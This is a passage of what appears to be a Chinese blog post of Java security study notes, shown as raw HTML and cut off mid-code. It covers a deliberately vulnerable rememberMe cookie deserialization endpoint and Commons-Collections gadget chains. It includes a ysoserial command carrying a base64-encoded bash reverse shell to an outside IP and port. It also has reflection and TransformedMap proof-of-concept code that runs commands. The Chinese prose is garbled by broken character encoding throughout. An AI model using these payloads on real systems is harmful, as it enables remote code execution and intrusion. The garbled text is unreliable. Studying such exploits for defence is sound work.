&lt;p&gt;</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/deserialize/rememberMe/vuln</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/rememberMe/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">rememberMeVul</span><span class="params">(HttpServletRequest request)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == cookie) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"No rememberMe cookie. Right?"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String rememberMe = cookie.getValue();</span><br><span class="line">        <span class="keyword">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bytes = <span class="keyword">new</span> ByteArrayInputStream(decoded);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bytes);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Are u ok?"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Check deserialize class using black list.</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/deserialize/rememberMe/security</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/rememberMe/security"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">rememberMeBlackClassCheck</span><span class="params">(HttpServletRequest request)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == cookie) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"No rememberMe cookie. Right?"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String rememberMe = cookie.getValue();</span><br><span class="line">        <span class="keyword">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bytes = <span class="keyword">new</span> ByteArrayInputStream(decoded);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            AntObjectInputStream in = <span class="keyword">new</span> AntObjectInputStream(bytes);  <span class="comment">// throw InvalidClassException</span></span><br><span class="line">            in.readObject();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidClassException e) &#123;</span><br><span class="line">            logger.info(e.toString());</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"I'm very OK."</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåº”è¯¥æ˜¯æ¨¡ä»¿shiroçš„rememberMecookieååºåˆ—åŒ–.ä¸‹é¢å…ˆæ¥å›é¡¾ä¸‹javaçš„åºåˆ—åŒ–çŸ¥è¯†</p><p><a href="https://www.mi1k7ea.com/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/</a></p><ul><li><p>about</p><blockquote><p>Java æä¾›äº†ä¸€ç§å¯¹è±¡åºåˆ—åŒ–çš„æœºåˆ¶ï¼šä¸€ä¸ªå¯¹è±¡å¯ä»¥è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªå­—èŠ‚åºåˆ—ï¼Œè¯¥å­—èŠ‚åºåˆ—åŒ…æ‹¬è¯¥å¯¹è±¡çš„æ•°æ®ã€æœ‰å…³å¯¹è±¡çš„ç±»å‹çš„ä¿¡æ¯å’Œå­˜å‚¨åœ¨å¯¹è±¡ä¸­æ•°æ®çš„ç±»å‹ã€‚å°†åºåˆ—åŒ–å¯¹è±¡å†™å…¥æ–‡ä»¶ä¹‹åï¼Œå¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–å‡ºæ¥ï¼Œå¹¶ä¸”å¯¹å®ƒè¿›è¡Œååºåˆ—åŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹è±¡çš„ç±»å‹ä¿¡æ¯ã€å¯¹è±¡çš„æ•°æ®ï¼Œè¿˜æœ‰å¯¹è±¡ä¸­çš„æ•°æ®ç±»å‹å¯ä»¥ç”¨æ¥åœ¨å†…å­˜ä¸­æ–°å»ºå¯¹è±¡ã€‚æ•´ä¸ªè¿‡ç¨‹éƒ½æ˜¯JVMç‹¬ç«‹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªå¹³å°ä¸Šåºåˆ—åŒ–çš„å¯¹è±¡å¯ä»¥åœ¨å¦ä¸€ä¸ªå®Œå…¨ä¸åŒçš„å¹³å°ä¸Šååºåˆ—åŒ–è¯¥å¯¹è±¡ã€‚</p></blockquote></li><li><p>usage</p></li></ul><p>1.å¼¥è¡¥æ“ä½œç³»ç»Ÿçš„å·®å¼‚<br>2.å‘è¿œç¨‹å¯¹è±¡å‘é€ä¿¡æ¯æ—¶ï¼Œéœ€è¦é€šè¿‡å¯¹è±¡åºåˆ—åŒ–æ¥ä¼ è¾“å‚æ•°å’Œè¿”å›å€¼<br>3.ä½¿ç”¨ä¸€ä¸ªBeanæ—¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯åœ¨è®¾è®¡é˜¶æ®µå¯¹å®ƒçš„çŠ¶æ€ä¿¡æ¯è¿›è¡Œé…ç½®ï¼Œç„¶è€Œè¿™ç§çŠ¶æ€ä¿¡æ¯éœ€è¦ä¿å­˜ä¸‹æ¥ï¼Œå¹¶åœ¨ç¨‹åºå¯åŠ¨æ—¶è¿›è¡ŒåæœŸæ¢å¤ï¼Œè¿™æ—¶æ˜¯é ååºåˆ—åŒ–æœºåˆ¶æ¥å®Œæˆçš„<br>4.æ–¹ä¾¿ä¿å­˜å¯¹è±¡ä¿¡æ¯ä»¥ä¾¿äºä¸‹æ¬¡JVMå¯åŠ¨æ—¶å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p><ul><li>dependencies</li></ul><p>1.å®ç° java.io.Serializable å¯¹è±¡<br>2.è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±æ€§å¿…é¡»æ³¨æ˜æ˜¯çŸ­æš‚çš„ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç»ƒæ‰‹çš„ä¾‹å­ã€‚<br>Userç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> num;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"name : "</span>+name+<span class="string">"\nnum : "</span>+num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>testç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title">serialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        user.name=<span class="string">"byc_404"</span>;</span><br><span class="line">        user.num=<span class="number">404</span>;</span><br><span class="line">        user.info();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream f= <span class="keyword">new</span> FileOutputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectOutputStream o =<span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line"></span><br><span class="line">            o.writeObject(user);</span><br><span class="line">            o.close();</span><br><span class="line">            f.close();</span><br><span class="line">            System.out.println(<span class="string">"[*]serialize done."</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title">unserialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileInputStream f= <span class="keyword">new</span> FileInputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectInputStream o =<span class="keyword">new</span> ObjectInputStream(f);</span><br><span class="line">            user=(User)o.readObject();</span><br><span class="line">            o.close();</span><br><span class="line">            f.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[*]unserialize done."</span>);</span><br><span class="line">        user.info();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        unserialize_test();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ³¨æ„ä¸Šé¢çš„è¯­å¥ç›´æ¥è°ƒç”¨è¯»å†™æ–‡ä»¶æ—¶éƒ½éœ€è¦å®ç°trycatchã€‚è€Œreadobjectæ—¶ç‰¹æ®Šçš„æ·»åŠ äº†ä¸€ä¸ªClassNotFound çš„å¼‚å¸¸ã€‚åœ¨ideaä¸­å†™å¥½åŸä»£ç åctrl+alt+tæ·»åŠ ä¼šè‡ªåŠ¨è€ƒè™‘åˆ°è¿™äº›é—®é¢˜ï¼Œ<br>ç”Ÿæˆçš„user.serçš„æ•°æ®</p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¼€å¤´AC ED è¡¨ç¤ºæ”¯æŒåºåˆ—åŒ–åè®®ã€‚00 05 åˆ™æ˜¯åºåˆ—åŒ–ç‰ˆæœ¬ã€‚è¿™æ˜¯åºåˆ—åŒ–æ•°æ®æ¯”è¾ƒæ˜¾è‘—çš„ç‰¹å¾ã€‚</p><p>ç”±äºç¼–ç¨‹ä¸­çš„é€‰æ‹©åŸå› ï¼Œæœ‰æ—¶éœ€è¦æˆ‘ä»¬å®ç°éé»˜è®¤çš„åºåˆ—åŒ–è¿‡ç¨‹ã€‚æ­¤æ—¶å¯ä»¥åœ¨å®ç°äº†Serializableæ¥å£çš„å‰æä¸‹æ·»åŠ ä¸¤ä¸ªæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream stream)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p><strong>åœ¨è°ƒç”¨ObjectOutputStream.writeObject()æ—¶ï¼Œä¼šæ£€æŸ¥æ‰€ä¼ é€’çš„Serializableå¯¹è±¡ï¼Œçœ‹çœ‹æ˜¯å¦å®ç°äº†è‡ªå·±çš„writeObject()ï¼Œè‹¥å®ç°äº†ï¼Œåˆ™è·³è¿‡æ­£å¸¸çš„åºåˆ—åŒ–è¿‡ç¨‹å¹¶è°ƒç”¨è‡ªå·±å®ç°çš„writeObject()ã€‚readObject()æ–¹æ³•åŒç†</strong></p><p>é‚£ä¹ˆå›åˆ°è¿œç¨‹ã€‚è¿™é‡Œç›´æ¥æ‰“ä¸€å‘å¼¹shellçš„payloadã€‚å»<a href="http://jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">jackson</a>ç›´æ¥è½¬æ¢ä¸‹ç¼–ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjcuMjQ2LjIwMi85MDAxIDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; | base64</span><br></pre></td></tr></table></figure><p>è¿™ç¯å¢ƒè²Œä¼¼æ˜¯åªæœ‰cc5çš„gadgetèƒ½ç”¨.åæ¥åœ¨åŸä½œè€…é‚£çœ‹åˆ°åº”è¯¥æ˜¯å¼•å…¥äº†apache-commons-collections 3.1.jar<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>CommonCollections å®¡è®¡</li></ul><p>ä¸‹é¢æ­£å¥½æ¥å®¡è®¡ä¸‹Commons-Collectionsè¿™ä¸ªåŒ…ã€‚<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></p><p>åœ¨è¿™ä¸‹å¥½jaråŒ…åæŠŠå®ƒåŠ è¿›library.å°±å¯ä»¥çœ‹æºç äº†ã€‚<br>æ¼æ´ä»£ç å‡ºç°åœ¨è¿™ä¸€éƒ¨åˆ†ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>TransformedMapç±»æ˜¯å®ç°äº†serializable,å¯¹Javaæ ‡å‡†æ•°æ®ç»“æ„Mapæ¥å£çš„ä¸€ä¸ªæ‰©å±•TransformedMap.decorate()æ–¹æ³•ï¼Œå¯ä»¥è·å¾—ä¸€ä¸ªTransformedMapçš„å®ä¾‹åŒ–çš„å¯¹è±¡ã€‚</p><p><code>TransformedMap.decorate()</code>æ–¹æ³•èƒ½å°†æ™®é€šçš„MapAè½¬æ¢ä¸ºTransformedMapBï¼ŒåŒæ—¶å¦‚æœ<code>TransformedMap.decorate()</code>æ–¹æ³•è®¾ç½®äº†ç¬¬äºŒä¸ªå‚æ•°keyTransformeræˆ–è€…ç¬¬ä¸‰ä¸ªå‚æ•°valueTransformerï¼Œå½“TransformedMapBè°ƒç”¨Mapçš„putæ–¹æ³•æˆ–è€…Map.Entryçš„setValueæ–¹æ³•å°±ä¼šè‡ªåŠ¨è§¦å‘åˆšæ‰è®¾ç½®çš„keyTransformeræˆ–è€…valueTransformerç›¸åº”çš„Transformer</p><p>Map.putä¸Map.Entryå…¶å®å°±æ˜¯Mapçš„ä¸¤ä¸ªæ¯”è¾ƒå¸¸è§çš„æ¥å£ã€‚å‰è€…å¯ä»¥å¾€mapä¸­è®¾ç½®ä¸€å¯¹é”®å€¼ã€‚åè€…åˆ™æ˜¯å®šä¹‰äº†getKey(),getValue()ï¼ŒsetKey(),setValue()ç­‰æ–¹æ³•å¯ä»¥ç”¨æ¥è·å–ä¿®æ”¹é”®å€¼ã€‚</p><blockquote><p>ç‰›é€¼çš„æ˜¯è¿™ä¸ªTransformerå¯ä»¥åˆ©ç”¨æ•°ç»„æ„é€ æˆChainedTransformerï¼ŒChainedTransformeræœ€ååˆ©ç”¨Javaçš„åå°„æœºåˆ¶å‘½ä»¤æ‰§è¡Œã€‚</p></blockquote><p>å…³äºåå°„å‘½ä»¤æ‰§è¡Œã€‚è¿™ä¸ªç®—æ˜¯javaéå¸¸å¸¸è§çš„å‘½ä»¤æŠ€å·§äº†ã€‚åœ¨SpELè·ŸSpring çš„sstiä¸­ç»å¸¸è§åˆ°ã€‚ä¸»è¦ç›®çš„å°±æ˜¯ç»•è¿‡æ²™ç›’ã€‚å½“ç„¶å¦‚phpçš„åºåˆ—åŒ–ä¸­ä¹Ÿæ›¾ç»é‡åˆ°è¿‡.è¿™ç®—æ˜¯JavaåŠ¨æ€ç‰¹æ€§çš„ä½“ç°ã€‚</p><p>ä¸€ä¸ªå¼¹è®¡ç®—å™¨çš„åå°„payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflect</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object input = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod("getMethod", new Class[] &#123; String.class, Class[].class &#125;);</span><br><span class="line">        input = method.invoke(input, <span class="keyword">new</span> Object[] &#123; <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ­¤æ—¶clsä¸ºMethodï¼Œå¯¹åº”getRuntimeæ–¹æ³•ï¼Œè·å–invokeæ–¹æ³•å¹¶æ‰§è¡Œ</span></span><br><span class="line">        cls = input.getClass();</span><br><span class="line">        method = cls.getMethod("invoke", new Class[] &#123; Object.class, Object[].class &#125;);</span><br><span class="line">        input = method.invoke(input, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ­¤æ—¶clsä¸ºRuntimeï¼Œå¯¹åº”Runtime.getRuntime()çš„ç»“æœï¼Œå¯è°ƒç”¨execæ–¹æ³•</span></span><br><span class="line">        cls = input.getClass();</span><br><span class="line">        method = cls.getMethod(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123; String<span class="class">.<span class="keyword">class</span> &#125;)</span>;</span><br><span class="line">        input = method.invoke(input, <span class="keyword">new</span> Object[] &#123; <span class="string">"calc"</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¸‹é¢æ¥è·Ÿç€JoyChouå¸ˆå‚…çš„åšæ–‡çœ‹çœ‹Map.putæ˜¯æ€ä¹ˆé€šè¿‡æ„é€ è¾¾æˆå‘½ä»¤æ‰§è¡Œçš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        innermap.put(<span class="string">"name"</span>, <span class="string">"byc_404"</span>);</span><br><span class="line"></span><br><span class="line">        Map outmap = TransformedMap.decorate(innermap, transformerChain, <span class="keyword">null</span>);</span><br><span class="line">        outmap.put(<span class="string">"quote"</span>,<span class="string">"23333"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨put()æ–¹æ³•é‚£ä¸‹ä¸€ä¸ªæ–­ç‚¹ã€‚ç¬¬ä¸€æ­¥æ˜¯è°ƒç”¨TransformedMap.put()æ–¹æ³•<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ç„¶åè¿›è¡Œä¸€ä¸ªkeyTransformeræ˜¯å¦ä¸ºç©ºçš„åˆ¤æ–­ã€‚æˆ‘ä»¬å› ä¸ºè®¾ç½®äº†ChainedTransformerä½œä¸ºkeyTransformer,å› æ­¤æ¥ä¸‹æ¥æ˜¯è°ƒç”¨ChainedTransformer.transform()<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„thiså°±æ˜¯ChainedTransformerå¯¹è±¡ã€‚<br>ç„¶åè¿™ä¸ªforå¾ªç¯ä¼šæ€»å…±è°ƒç”¨å››æ¬¡transform(),è°ƒç”¨1æ¬¡<code>ConstantTransformer.transform()</code>æ–¹æ³•ï¼Œç„¶åè°ƒç”¨3æ¬¡<code>InvokerTransformer.transform()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 